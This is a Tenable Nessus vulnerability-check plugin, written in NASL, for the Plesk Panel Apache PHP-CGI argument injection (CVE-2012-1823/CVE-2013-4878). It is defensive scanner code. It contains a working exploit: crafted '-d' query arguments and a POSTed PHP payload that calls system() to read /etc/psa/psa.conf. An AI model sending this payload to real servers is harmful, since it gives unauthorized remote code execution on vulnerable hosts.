#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(66844);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2016/11/23 20:42:23 $");

  script_name(english:"Plesk Panel Apache Arbitrary PHP Code Injection");
  script_summary(english:"Attempts to execute arbitrary code");

  script_cve_id("CVE-2012-1823", "CVE-2013-4878");
  script_bugtraq_id(53388);
  script_osvdb_id(81633, 93979);
  script_xref(name:"EDB-ID", value:"25986");
  script_xref(name:"CERT", value:"673343");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server is affected by a remote PHP code code injection
vulnerability.  "
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote host contains an Apache web server installation that is
included with Parallels Plesk Panel and that is affected by a remote
PHP code injection vulnerability. Due to an Apache configuration
issue, a remote, unauthenticated attacker can exploit this issue by
crafting a request allowing them to execute arbitrary PHP code,
subject to the privileges of the Apache user."
  );
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2013/Jun/21");
  script_set_attribute(attribute:"see_also", value:"http://kb.parallels.com/116241");
  script_set_attribute(
    attribute:"solution",
    value:
'Upgrade Plesk Panel to the latest available version or refer to the
referenced link for mitigation options.'
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'PHP CGI Argument Injection');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/06/05");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/06/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:parallels:parallels_plesk_panel");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

port = get_http_port(default:80, php:TRUE);

# Plesk file that contains the location of various services/utilities
cmd = 'cat /etc/psa/psa.conf';
cmd_pat = "# Plesk tree";

uri = '?-d+allow_url_include=on+-d+safe_mode=off+-d' +
          '+suhosin.simulation=on+-d+disable_functions=""+-d+open_basedir' +
          '=none+-d+auto_prepend_file=php://input+-n';

uri = urlencode(
  str        : uri,
  unreserved : "+?"
);

path = urlencode(
  str        : "/phppath/php",
  unreserved : "/"
);

payload = '<?php echo "Content-Type:text/html'+"\r\n\r\n"+
          '";system("'+cmd+'");?>';

res = http_send_recv3(
  method : "POST",
  port   : port,
  item   : path + uri,
  data   : payload,
  add_headers  : make_array("Content-Type",
                "application/x-www-form-urlencoded"),
  exit_on_fail : TRUE
);
body = res[2];

if (egrep(pattern:cmd_pat, string:res[2]))
{
  body = strstr(res[2], cmd_pat);
  if (report_verbosity > 0)
  {
    snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
    max = 20;
    report =
      '\nNessus was able to verify the issue exists using the following request :' +
      '\n' +
      '\n' + http_last_sent_request() +
      '\n' +
      '\n';
    if (report_verbosity > 1)
    {
      report +=
        '\nNessus executed the command : "'+cmd+'" which produced the' +
        '\nfollowing output truncated to '+max+' lines :' +
        '\n' +
        '\n' + snip +
        '\n' + beginning_of_response(resp:body, max_lines:max) +
        '\n' + snip +
        '\n';
    }
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
audit(AUDIT_NOT_DETECT, "The Plesk Panel Apache configuration vulnerability", port);
